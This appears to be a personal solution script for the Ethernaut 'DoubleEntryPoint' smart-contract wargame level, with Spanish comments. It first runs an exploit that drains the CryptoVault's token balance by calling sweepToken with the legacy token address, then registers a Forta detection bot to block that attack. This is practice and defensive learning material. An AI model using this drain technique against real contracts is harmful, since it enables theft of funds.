/* DOUBLEENTRYPOINT:

//PROBAMOS EL EXPLOIT ANTES DE HACER EL BOT MONITOR:
// get the addresses from DoubleEntryPoint
const cryptoVaultAddress = await contract.cryptoVault();
const legacyTokenAddress = await contract.delegatedFrom();

// check initial balance
await contract.balanceOf(cryptoVaultAddress).then(b => b.toString());

// call sweepToken of CryptoVault with LegacyToken as the parameter
const _function = {
  "inputs": [
    { 
      "name": "token",
      "type": "address"
    }
  ],
  "name": "sweepToken", 
  "type": "function"
};
const _parameters = [
  legacyTokenAddress
];
const _calldata = web3.eth.abi.encodeFunctionCall(_function, _parameters);
await web3.eth.sendTransaction({
  from: player,
  to: cryptoVaultAddress,
  data: _calldata
});

// check balance again to see it be 0
await contract.balanceOf(cryptoVaultAddress).then(b => b.toString());

//CREAMOS EL BOT MONITOR
//ver contracts/exploit.sol

//Deployado en: 0x7CDCbF6e240bB40eC451F9eA0D3C0719869d9959


//Seteamos el bot detector en la consola de ethernaut

const fortaAddress = await contract.forta()
const detectionBotAddress = "0x7CDCbF6e240bB40eC451F9eA0D3C0719869d9959" // address del bot deployado

// call setDetectionBot of Forta with your detection bot address as the parameter
const _function2 = {
  "inputs": [
    { 
      "name": "detectionBotAddress",
      "type": "address"
    }
  ],
  "name": "setDetectionBot", 
  "type": "function"
};
const _parameters2 = [
  detectionBotAddress
];
const _calldata2 = web3.eth.abi.encodeFunctionCall(_function2, _parameters2);
await web3.eth.sendTransaction({
  from: player,
  to: fortaAddress,
  data: _calldata2
})

LISTO!!!!
  */